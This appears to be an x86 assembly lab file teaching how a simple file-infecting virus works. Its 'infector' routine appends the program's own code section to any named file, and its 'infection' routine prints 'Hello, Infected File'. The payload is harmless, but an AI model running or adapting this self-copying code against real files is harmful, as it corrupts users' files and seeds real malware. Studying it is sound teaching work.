section .data
    hello_msg:  db "Hello, Infected File", 10   ; message + newline
    hello_len:  equ $ - hello_msg               ; length = 21

section .text
    global _start
    global system_call
    global infection
    global infector
    global code_start
    global code_end
    extern main

; Entry point - sets up stack and calls main
_start:
    pop     dword ecx              ; argc
    mov     esi, esp               ; argv pointer
    push    esi                    ; push argv
    push    ecx                    ; push argc
    call    main

    ; Exit with return value from main
    mov     ebx, eax               ; exit code
    mov     eax, 1                 ; sys_exit
    int     0x80

; System call wrapper (CDECL calling convention)
; int system_call(int syscall_num, int arg1, int arg2, int arg3)
system_call:
    push    ebp
    mov     ebp, esp
    push    ebx
    push    ecx
    push    edx

    mov     eax, [ebp+8]           ; syscall number
    mov     ebx, [ebp+12]          ; arg1
    mov     ecx, [ebp+16]          ; arg2
    mov     edx, [ebp+20]          ; arg3
    int     0x80

    pop     edx
    pop     ecx
    pop     ebx
    pop     ebp
    ret

; ============================================
; Virus code section
; ============================================

code_start:

; void infection(void)
; Prints "Hello, Infected File" to stdout
infection:
    push    ebp
    mov     ebp, esp
    push    ebx

    ; sys_write(1, hello_msg, hello_len)
    mov     eax, 4                 ; sys_write
    mov     ebx, 1                 ; stdout
    mov     ecx, hello_msg         ; message
    mov     edx, hello_len         ; length
    int     0x80

    pop     ebx
    pop     ebp
    ret

; void infector(char *filename)
; Opens file in append mode, writes code_start to code_end, closes file
infector:
    push    ebp
    mov     ebp, esp
    push    ebx
    push    esi

    ; sys_open(filename, O_WRONLY|O_APPEND, 0)
    ; O_WRONLY = 1, O_APPEND = 0x400 => 0x401
    mov     eax, 5                 ; sys_open
    mov     ebx, [ebp+8]           ; filename
    mov     ecx, 0x401             ; O_WRONLY | O_APPEND
    mov     edx, 0644o             ; permissions (ignored for existing file)
    int     0x80

    ; Check for error
    cmp     eax, 0
    jl      .infector_done

    mov     esi, eax               ; save file descriptor

    ; sys_write(fd, code_start, code_end - code_start)
    mov     eax, 4                 ; sys_write
    mov     ebx, esi               ; file descriptor
    mov     ecx, code_start        ; buffer start
    mov     edx, code_end
    sub     edx, code_start        ; length = code_end - code_start
    int     0x80

    ; sys_close(fd)
    mov     eax, 6                 ; sys_close
    mov     ebx, esi               ; file descriptor
    int     0x80

.infector_done:
    pop     esi
    pop     ebx
    pop     ebp
    ret

code_end:
